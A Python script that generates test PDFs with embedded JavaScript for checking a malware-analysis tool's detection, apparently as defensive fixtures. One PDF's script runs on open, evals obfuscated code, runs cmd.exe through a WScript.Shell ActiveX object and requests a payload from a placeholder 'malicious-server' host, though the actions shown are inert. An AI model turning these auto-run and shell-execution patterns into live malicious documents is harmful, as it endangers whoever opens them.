#!/usr/bin/env python3
"""
Create a test PDF file with embedded JavaScript for testing Fathom's detection capabilities.
This creates a legitimate test file to verify our PDF analysis engine works correctly.
"""

from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.lib.colors import black
import os
from pathlib import Path

def create_test_pdf_with_javascript():
    """Create a test PDF with embedded JavaScript for analysis testing"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "test_pdf_with_javascript.pdf"
    
    # Create basic PDF with ReportLab
    c = canvas.Canvas(str(pdf_path), pagesize=letter)
    
    # Add some basic content
    c.setFont("Helvetica", 12)
    c.drawString(100, 750, "Test PDF Document with JavaScript")
    c.drawString(100, 730, "This is a test file for Fathom static analysis.")
    c.drawString(100, 710, "Created for testing JavaScript detection capabilities.")
    
    # Add a simple form field that will contain JavaScript
    c.setFont("Helvetica", 10)
    c.drawString(100, 650, "Test Form Field:")
    
    # Create a text field with JavaScript action
    from reportlab.pdfbase import pdfmetrics
    from reportlab.pdfbase.ttfonts import TTFont
    
    # Add some metadata
    c.setTitle("Test PDF with JavaScript")
    c.setAuthor("Fathom Test Suite")
    c.setSubject("JavaScript Detection Test")
    c.setCreator("Fathom PDF Test Generator")
    
    c.showPage()
    c.save()
    
    # Now we need to manually inject JavaScript into the PDF
    # Read the generated PDF and modify it to include JavaScript
    with open(pdf_path, 'rb') as f:
        pdf_content = f.read()
    
    # Convert to string for manipulation
    pdf_str = pdf_content.decode('latin-1')
    
    # Find the catalog object and add JavaScript
    # This is a simplified approach - in a real PDF, JavaScript would be more complex
    javascript_code = """
/JavaScript <<
/Names [(EmbeddedJS) <<
/S /JavaScript
/JS (
    // Test JavaScript code for detection
    app.alert("This is test JavaScript in a PDF");
    
    // Simulate some suspicious-looking functions
    var shellcode = "test_payload_data";
    var decoded = unescape("%41%42%43");
    
    // Network-related functions
    var url = "http://test-server.example.com/data";
    
    // File system operations
    var fs = app.getPath({cCategory: "user", cFolder: "desktop"});
    
    console.println("JavaScript execution test");
)
>>]
>>
"""
    
    # Insert JavaScript into the PDF structure
    # Find a good insertion point (after the catalog)
    catalog_pos = pdf_str.find('/Type /Catalog')
    if catalog_pos != -1:
        # Find the end of the catalog object
        end_pos = pdf_str.find('>>', catalog_pos)
        if end_pos != -1:
            # Insert JavaScript before the closing >>
            modified_pdf = (pdf_str[:end_pos] + 
                          javascript_code + 
                          pdf_str[end_pos:])
            
            # Write the modified PDF
            with open(pdf_path, 'wb') as f:
                f.write(modified_pdf.encode('latin-1'))
    
    return pdf_path

def create_advanced_js_pdf():
    """Create a more sophisticated PDF with multiple JavaScript elements"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "advanced_js_test.pdf"
    
    # Create a raw PDF with embedded JavaScript using manual PDF construction
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(TestJS1) 3 0 R (TestJS2) 4 0 R]
>>
>>
/OpenAction <<
/Type /Action
/S /JavaScript
/JS (app.alert("PDF opened with JavaScript!");)
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [5 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/S /JavaScript
/JS (
// Suspicious JavaScript code for testing
var shellcode = unescape("%u4141%u4242%u4343");
var payload = String.fromCharCode(0x41, 0x42, 0x43);

// Network operations
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://malicious-server.example.com/payload", false);

// File operations
try {
    var fs = new ActiveXObject("Scripting.FileSystemObject");
    var file = fs.CreateTextFile("C:\\\\temp\\\\test.txt", true);
} catch(e) {}

// Obfuscated code
eval(unescape("app%2Ealert%28%22Obfuscated%20JavaScript%22%29%3B"));

console.println("Advanced JavaScript test executed");
)
>>
endobj

4 0 obj
<<
/S /JavaScript
/JS (
// Additional JavaScript for comprehensive testing
function executePayload() {
    var encoded = "dGVzdCBwYXlsb2FkIGRhdGE="; // base64: "test payload data"
    var decoded = atob(encoded);
    
    // Simulate malicious behavior patterns
    var wscript = new ActiveXObject("WScript.Shell");
    wscript.Run("cmd.exe /c echo test", 0, true);
    
    // URL extraction test
    var urls = [
        "http://command-server.example.com/cmd",
        "https://data-exfil.example.com/upload",
        "ftp://drop-zone.example.com/files"
    ];
    
    return "JavaScript analysis test complete";
}

executePayload();
)
>>
endobj

5 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 6 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj

6 0 obj
<<
/Length 200
>>
stream
BT
/F1 12 Tf
100 700 Td
(Advanced JavaScript Test PDF) Tj
0 -20 Td
(This PDF contains multiple JavaScript objects for testing) Tj
0 -20 Td
(Fathom static analysis detection capabilities.) Tj
0 -40 Td
(Created: """ + str(Path(__file__).stat().st_mtime) + """) Tj
ET
endstream
endobj

xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000358 00000 n 
0000000415 00000 n 
0000001200 00000 n 
0000002100 00000 n 
0000002350 00000 n 
trailer
<<
/Size 7
/Root 1 0 R
>>
startxref
2600
%%EOF"""
    
    with open(pdf_path, 'w', encoding='latin-1') as f:
        f.write(pdf_content)
    
    return pdf_path

def create_simple_js_pdf():
    """Create a simple PDF with basic JavaScript for quick testing"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "simple_js_test.pdf"
    
    # Simple PDF with JavaScript
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Hello from JavaScript in PDF!");)
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 150
>>
stream
BT
/F1 12 Tf
100 700 Td
(Simple JavaScript Test PDF) Tj
0 -20 Td
(Contains basic JavaScript for detection testing) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000150 00000 n 
0000000207 00000 n 
0000000294 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
500
%%EOF"""
    
    with open(pdf_path, 'w', encoding='latin-1') as f:
        f.write(pdf_content)
    
    return pdf_path

if __name__ == "__main__":
    print("🔧 Creating test PDF files with JavaScript...")
    
    try:
        # Create test samples directory
        test_dir = Path("test_samples")
        test_dir.mkdir(exist_ok=True)
        
        print("\n📄 Creating simple JavaScript PDF...")
        simple_pdf = create_simple_js_pdf()
        print(f"✅ Created: {simple_pdf}")
        
        print("\n📄 Creating advanced JavaScript PDF...")
        advanced_pdf = create_advanced_js_pdf()
        print(f"✅ Created: {advanced_pdf}")
        
        print("\n📄 Creating ReportLab-based PDF with JavaScript...")
        reportlab_pdf = create_test_pdf_with_javascript()
        print(f"✅ Created: {reportlab_pdf}")
        
        print(f"\n🎯 Test files created in: {test_dir.absolute()}")
        print("\n📋 Test Files Summary:")
        print("1. simple_js_test.pdf - Basic JavaScript detection test")
        print("2. advanced_js_test.pdf - Complex JavaScript with suspicious patterns")
        print("3. test_pdf_with_javascript.pdf - ReportLab-generated with injected JS")
        
        print("\n🚀 Next Steps:")
        print("1. Upload these files to your Fathom dashboard")
        print("2. Check the Static Analysis tab for JavaScript detection")
        print("3. Verify the Analysis Engine Status shows library availability")
        print("4. Generate static analysis reports to see detailed findings")
        
    except Exception as e:
        print(f"❌ Error creating test files: {e}")
        import traceback
        traceback.print_exc()